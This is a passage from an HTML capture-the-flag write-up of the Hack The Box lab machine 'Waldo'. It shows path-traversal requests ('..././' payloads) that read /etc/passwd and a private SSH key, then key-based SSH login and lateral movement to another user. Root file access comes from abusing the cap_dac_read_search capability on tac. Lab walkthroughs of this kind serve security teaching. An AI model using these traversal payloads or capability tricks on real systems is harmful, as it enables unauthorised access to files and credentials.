class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">nobody:x:65534:65534:nobody:</span><span class="se">\/</span><span class="s2">home</span><span class="se">\/</span><span class="s2">nobody:</span><span class="se">\/</span><span class="s2">bin</span><span class="se">\/</span><span class="s2">sh</span><span class="se">\n</span><span class="s2">nginx:x:100:101:nginx:</span><span class="se">\/</span><span class="s2">var</span><span class="se">\/</span><span class="s2">lib</span><span class="se">\/</span><span class="s2">nginx:</span><span class="se">\/</span><span class="s2">sbin</span><span class="se">\/</span><span class="s2">nologin</span><span class="se">\n</span><span class="s2">"</span><span class="p">}</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>File Contents:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code>root:x:0:0:root:/root:/bin/ash
...omitted...
operator:x:11:0:operator:/root:/bin/sh
...omitted...
postgres:x:70:70::/var/lib/postgresql:/bin/sh
...omitted...
<mark>nobody:x:65534:65534:nobody:/home/nobody:/bin/sh</mark>
...omitted...</code></pre>
</div>
</div>
</blockquote>
</div>
<hr>
</div>
</div>
<div class="sect1">
<h2 id="part-4-generate-user-shell">PART 4 : GENERATE USER SHELL</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Using the ability to read local files, let&#8217;s explore the user, <span style="color:red"><strong><code>nobody</code></strong>'s</span>, home directory:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<div class="title"><span style="color:red"><strong><code>nobody</code></strong>'s home directory</span></div>
<p>HTTP Request:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="http"><span class="nf">POST</span> <span class="nn">/dirRead.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="s">...omitted...</span>

path=..././..././..././home/nobody/</code></pre>
</div>
</div>
<div class="paragraph">
<p>HTTP Response:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="php"><span class="p">[</span><span class="s2">"."</span><span class="p">,</span><span class="s2">".."</span><span class="p">,</span><span class="s2">".ash_history"</span><span class="p">,</span><span class="s2">"<mark>.ssh</mark>"</span><span class="p">,</span><span class="s2">".viminfo"</span><span class="p">,</span><span class="s2">"user.txt"</span><span class="p">]</span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<div class="title"><span style="color:red">The <strong><code>.ssh</code></strong> directory</span></div>
<p>HTTP Request:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="http"><span class="nf">POST</span> <span class="nn">/dirRead.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="s">...omitted...</span>

path=..././..././..././home/nobody/.ssh/</code></pre>
</div>
</div>
<div class="paragraph">
<p>HTTP Response:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="php"><span class="p">[</span><span class="s2">"."</span><span class="p">,</span><span class="s2">".."</span><span class="p">,</span><span class="s2">"<mark>.monitor</mark>"</span><span class="p">,</span><span class="s2">"authorized_keys"</span><span class="p">,</span><span class="s2">"known_hosts"</span><span class="p">]</span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<div class="title"><span style="color:red">The <strong><code>.monitor</code></strong> file</span></div>
<p>HTTP Request:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="http"><span class="nf">POST</span> <span class="nn">/fileRead.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="s">...omitted...</span>

file=..././..././..././home/nobody/.ssh/.monitor</code></pre>
</div>
</div>
<div class="paragraph">
<p>HTTP Response:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="json"><span class="p">{</span><span class="nl">"file"</span><span class="p">:</span><span class="s2">"-----BEGIN RSA PRIVATE KEY-----</span><span class="se">\N</span><span class="s2">MIIEOGIBAAKCAQEAS7SYTDE++NHAWB9E+NN3V5T1DP1TYHC+4O8D362L5NWF6CPL</span><span class="se">\N</span><span class="s2">MR4JH6N4NCCDM1ZU+QB77LI8ZOVYMBTIEY4FM07X4PQT4ZENBFQKWKOCYV1TLW6F</span><span class="se">\N</span><span class="s2">87S0FZBHYAIZGRNNELLHB1IZIJPDVJUBSXG6S2CXALE14CJ+PNEIRTSYMIQ1NJCS</span><span class="se">\N</span><span class="s2">DGCC</span><span class="se">\/</span><span class="s2">GNPW</span><span class="se">\/</span><span class="s2">AANIN4VW9KSLLQIAEDJFCHY55SCJ5162Y9+I1XZQF8E9B12WVXIRVN</span><span class="se">\N</span><span class="s2">O8PLGNFJVW6SHHMPJSUE9VJAIEH+N+5XKBC8</span><span class="se">\/</span><span class="s2">6PCEOWQS9UJRKNZH9T1LJQ4FX1V</span><span class="se">\N</span><span class="s2">VI93DAQ3BZ3DHIIWAWAFMQZG+JSTHSWOIWR73WIDAQABAOIBADHWL</span><span class="se">\/</span><span class="s2">WDMUPEW6KU</span><span class="se">\N</span><span class="s2">VMZHRU3GCJUZWBET0TNEJBL</span><span class="se">\/</span><span class="s2">KXNWXR9B2I0DHWFG8IJW1LCU29NV8B+EHGP+BR</span><span class="se">\/</span><span class="s2">6</span><span class="se">\N</span><span class="s2">PKHMFP66350XYLNSQISHHIRMOSPYDGQVST4KBCP5VBTTDGC7RZF+EQZYEQFDRKW5</span><span class="se">\N</span><span class="s2">8KUNPTTMNWWLPYYJLSJMSRSN4BQYT3VRKTYKJ9IGU2RRKGXRNDCAC9EXGRUEVJ3Q</span><span class="se">\N</span><span class="s2">1H+7O8KGEPMKNEOGUGEJRN69HXYHFBEJ0WLLL8WORT9YUMMOX</span><span class="se">\/</span><span class="s2">05QOOBL4KQXUM7</span><span class="se">\N</span><span class="s2">VXI2YWU46+QTZTMEOKJOYLCGLYXDKG5ONDFDPBW3W8O6ULVFKV467M3ZB5YE8GES</span><span class="se">\N</span><span class="s2">DVA3YLECGYEA7JK51MVUGSIFF6GKXSNB</span><span class="se">\/</span><span class="s2">W2CZGE9TIXBWUQWEEIG0BMQQVX2ZWWO</span><span class="se">\N</span><span class="s2">V0OG0X</span><span class="se">\/</span><span class="s2">IROXACP6Z9WGPIC6FHVGJD</span><span class="se">\/</span><span class="s2">4BNLTR+A</span><span class="se">\/</span><span class="s2">LWQWFT1B6L03XDSYAIYIWI9XR</span><span class="se">\N</span><span class="s2">XSB2SLNWP56A</span><span class="se">\/</span><span class="s2">5TWTPOKFDBGCQRQHVUKWSHLYFOZGQA0ZTMNV71YKH0CGYEAWSSY</span><span class="se">\N</span><span class="s2">QFFDAWRVVZJP26YF</span><span class="se">\/</span><span class="s2">JNZAVLCAC5HMHO7EX5ISCVCX86MHQPEYAFCECZN2DFFOPQI</span><span class="se">\N</span><span class="s2">YZHZGB9N6Z01YUEKQRKNO3TA6JYJ9OJAMF8GZWVUTPZN41KSND4MWETBED4BUAH1</span><span class="se">\N\/</span><span class="s2">PACW</span><span class="se">\/</span><span class="s2">+</span><span class="se">\/</span><span class="s2">OYSH4BWKKNVHKNW36C+WMNOAX1FWQISCGYBYW</span><span class="se">\/</span><span class="s2">IMNLA3DRM3CIAA32IU</span><span class="se">\N</span><span class="s2">LROTP4QGAAMXPNCSMIPAGE6CRFVHIUOZ1SFNBV189Q8ZBM4PXQGKLLOJ8B33HDQ</span><span class="se">\/\N</span><span class="s2">LNN2N1WYTIYEUGA</span><span class="se">\/</span><span class="s2">QMDKOPB+TUFF1A5EZZZ0UR5WLLWA5NBEALDNOYTBK1P5N4KP</span><span class="se">\N</span><span class="s2">W7UYNREX6DGOBT2MD+10CQKBGGVQLYUNE20K9QSHVZTU3E9Z1RL+6LLDMZTFC3G9</span><span class="se">\N</span><span class="s2">1HLMBKDTJJJ</span><span class="se">\/</span><span class="s2">XAJAZUIOF4RS</span><span class="se">\/</span><span class="s2">INNKJ6+QYGKFAPRXXCPF9NACLQJAZGAMXW50AQT</span><span class="se">\N</span><span class="s2">RJ1BHUCZZCUGQABTPC6VYJ</span><span class="se">\/</span><span class="s2">HLLLZPIC05AIEHDDVTOPK</span><span class="se">\/</span><span class="s2">0WUY64FDS0VCCAYMMDR</span><span class="se">\N</span><span class="s2">X</span><span class="se">\/</span><span class="s2">PLAOGAS6UHBCM5TWZHTL</span><span class="se">\/</span><span class="s2">HDPROFAR3QKXWZ5XVAYKB90XGIPS5CWUGCCSVWQF2</span><span class="se">\N</span><span class="s2">DVVNY8GKBM</span><span class="se">\/</span><span class="s2">OENWHNTLWRTEJ5QDEAM40OJ</span><span class="se">\/</span><span class="s2">MWCDC6KPV1LJXRW2R5MCH9ZGBNFLA</span><span class="se">\N</span><span class="s2">W0IKCBUAM5XZGU</span><span class="se">\/</span><span class="s2">YSKMSCBMNMA8A5NDRWGFEFE+VGDVPARIE0RO=</span><span class="se">\N</span><span class="s2">-----END RSA PRIVATE KEY-----</span><span class="se">\N</span><span class="s2">"</span><span class="p">}</span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>We get a private key which we then could use to login via SSH with the user, <strong><code>nobody</code></strong>:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="title"><span style="color:red">Fix the permissions of the private key then login</span></div>
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">chmod </span>400 .monitor

<span class="nv">$ </span>ssh <span class="nt">-i</span> .monitor <span class="nt">-l</span> nobody 10.10.10.87

<span class="nv">$ </span><span class="nb">id

  </span><span class="nv">uid</span><span class="o">=</span>65534<span class="o">(</span>nobody<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>65534<span class="o">(</span>nobody<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>65534<span class="o">(</span>nobody<span class="o">)</span>

<span class="nv">$ </span><span class="nb">cat </span>user.txt

  3276........................9d24</code></pre>
</div>
</div>
</blockquote>
</div>
<hr>
</div>
</div>
<div class="sect1">
<h2 id="part-5-lateral-movement-nobody-monitor">PART 5 : LATERAL MOVEMENT (nobody &#8594; monitor)</h2>
<div class="sectionbody">
<div class="paragraph">
<p>There was nothing going on much with the user, <span style="color:orange"><strong><code>nobody</code></strong></span>, so when I re-examined the <span style="color:orange"><strong><code>.ssh</code></strong></span> directory, I noticed something in the <span style="color:orange"><strong><code>authorized_keys</code></strong></span> file:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="title"><span style="color:red">The <strong><code>authorized_keys</code></strong> file</span>:</div>
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">cd</span> ~/.ssh

<span class="nv">$ </span><span class="nb">cat </span>authorized_keys

  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgk
  fqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlR
  tJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbB
  VeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+a
  rOD6NJOFJY4jBHvf <span class="c"><mark>monitor@waldo</mark></span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>The private key, <span style="color:orange"><strong><code>.monitor</code></strong></span>, was originally created for the user, <span style="color:orange"><strong><code>monitor</code></strong></span> which doesn&#8217;t seem to be anywhere in this box so I tried to connect to <span style="color:orange"><strong><code>monitor@waldo</code></strong></span> from within the current shell using SSH.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="title"><span style="color:red">The <strong><code>authorized_keys</code></strong> file</span>:</div>
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>ssh <span class="nt">-i</span> ~/.ssh/.monitor monitor@waldo <span class="nt">-t</span> sh

<span class="nv">$ </span><span class="nb">id

  </span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>monitor<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>monitor<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>monitor<span class="o">)</span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>I used the <strong><code>-t</code></strong> option to force an inactive shell from the connection.</p>
</div>
<hr>
</div>
</div>
<div class="sect1">
<h2 id="part-6-privilege-escalation-monitor-root">PART 6 : PRIVILEGE ESCALATION (monitor &#8594; root)</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Enumerating the system:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="title"><span style="color:red">The <strong><code>~/bin</code></strong> directory</span>:</div>
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>

  drwxrwx--- 3 app-dev monitor 4096 May  3  2018 app-dev
  dr-xr-x--- 2 root    monitor 4096 May  3  2018 <span class="c"><mark>bin</mark></span>

<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lA</span> ~/bin

  lrwxrwxrwx 1 root root  7 May  3  2018 <span class="nb">ls</span> -&gt; /bin/ls
  lrwxrwxrwx 1 root root 13 May  3  2018 most -&gt; /usr/bin/most
  lrwxrwxrwx 1 root root  7 May  3  2018 red -&gt; /bin/ed
  lrwxrwxrwx 1 root root  9 May  3  2018 rnano -&gt; /bin/nano</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>The files are symbolically linked to the <strong><code>/bin</code></strong> and <strong><code>/usr/bin</code></strong> directories so they must be standard binaries but maybe they can do much more:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="title"><span style="color:red">Binary capabilities</span>:</div>
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>getcap ~/bin/<span class="k"><strong></span>

  sh: 8: getcap: not found

<span class="nv">$ </span>find / <span class="nt">-name</span> getcap 2&gt;/dev/null

  /sbin/getcap

<span class="nv">$ </span>/sbin/getcap ~/bin/<span class="k"></strong></span>

<span class="nv">$ </span>/sbin/getcap /usr/bin/<span class="k">*</span>

  /usr/bin/tac <span class="o">=</span> <span class="c"><mark>cap_dac_read_search+ei</mark></span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>The binay, <span style="color:orange"><strong><code>/usr/bin/tac</code></strong></span>, has the linux capability, <span style="color:orange"><strong><code>cap_dac_read_search</code></strong></span> which means it could bypass file read permissions (execute permissions are also bypassed for directories) while <span style="color:orange"><strong><code>+ei</code></strong></span> means that the capability is effective and inheritable.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="title"><span style="color:red">Reading <strong><code>root.txt</code></strong></span>:</div>
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">tac</span> /root/root.txt

  8fb6........................4f6c</code></pre>
</div>
</div>
</blockquote>
</div>
</div>
</div></section>
       </div>
    </div>

    <script>
      function openNav() {
        document.getElementById("sidebar").style.width = "250px";
        document.getElementById("content").style.marginLeft = "250px";
      }
      function closeNav() {
        document.getElementById("sidebar").removeAttribute("style");
        document.getElementById("content").removeAttribute("style");
      } 
    </script>

    
      <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'true', 'auto');
        ga('send', 'pageview');
      </script>
    
  </body>
</html>
